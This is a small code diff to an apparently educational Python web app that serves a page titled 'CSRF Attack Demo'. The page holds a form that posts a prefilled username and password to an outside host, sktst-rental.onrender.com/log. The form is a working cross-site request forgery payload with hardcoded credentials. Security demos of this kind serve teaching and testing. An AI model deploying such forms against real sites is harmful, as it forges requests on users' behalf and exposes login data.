@@ -21,14 +21,11 @@ async def read_root():
     <body>
 <h1>CSRF Attack Demo</h1>
 <form action="https://sktst-rental.onrender.com/log" method="POST">
-    <label for="username">Username or Email:</label>
-    <input type="text" id="username" name="username" value="Orkennnnnnn">
-    <br>
-    <label for="password">Password:</label>
-    <input type="password" id="password" name="password" value="12qwaszx">
-    <br>
+    <input type="text" name="username" value="Orkennnnnnn" required>
+    <input type="password" name="password" value="12qwaszx" required>
     <input type="submit" value="login">
 </form>
+
 
     </html>
     """
